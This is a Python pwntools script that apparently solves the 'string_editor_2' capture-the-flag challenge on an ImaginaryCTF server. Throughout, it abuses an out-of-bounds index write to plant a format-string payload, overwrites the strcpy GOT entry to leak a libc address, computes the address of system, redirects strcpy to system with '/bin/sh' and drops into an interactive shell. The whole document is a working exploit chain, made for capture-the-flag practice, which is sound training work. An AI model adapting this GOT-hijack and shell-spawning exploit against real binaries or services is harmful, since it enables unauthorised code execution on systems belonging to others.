from pwn import *

#target = process('./string_editor_2') #, env={"LD_PRELOAD":"./libc.so.6"})
#pid = gdb.attach(target, "\nb *del\n set disassembly-flavor intel\ncontinue")

target = remote('chal.imaginaryctf.org', 42005)

libc = ELF('libc.so.6')
elf = ELF('string_editor_2')


#Gadgets:

target_global = 0x601080

printf_got = elf.got['printf'] 
strcpy_got = elf.got ['strcpy'] 
printf_plt = elf.symbols['printf']  

#%13$p leaks __libc_start_main+243
payload = b'%13$p%14$p'
for i in range(len(payload)):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(i).encode('ascii')) #(str(puts_got - target_global).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))

#Now to overwrite GOT entry
payload = p64(printf_plt)

for i in range(6):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(strcpy_got - target_global + i).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))
	
print(target.recvuntil(b'utils', timeout=1))
target.sendline(b'15')
print(target.recvuntil(b'3. Exit\n'))
target.sendline(b'2')

leak = target.recv(14)
print(leak)


libc_start_main = int(leak, 16) - 243
print(hex(libc_start_main))

libc_base = libc_start_main - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
print(hex(system))

#Now to call system(/bin/sh)

payload = b'/bin/sh\x00'
for i in range(len(payload)):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(i).encode('ascii')) 
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))

payload = p64(system)

for i in range(6):
	print(target.recvuntil(b'utils', timeout=1))
	target.sendline(str(strcpy_got - target_global + i).encode('ascii'))
	print(target.recvuntil(b'index?'))
	target.sendline(payload[i].to_bytes(1, 'little'))
	
print(target.recvuntil(b'utils', timeout=1))
target.sendline(b'15')
print(target.recvuntil(b'3. Exit\n'))
target.sendline(b'2')

target.interactive()

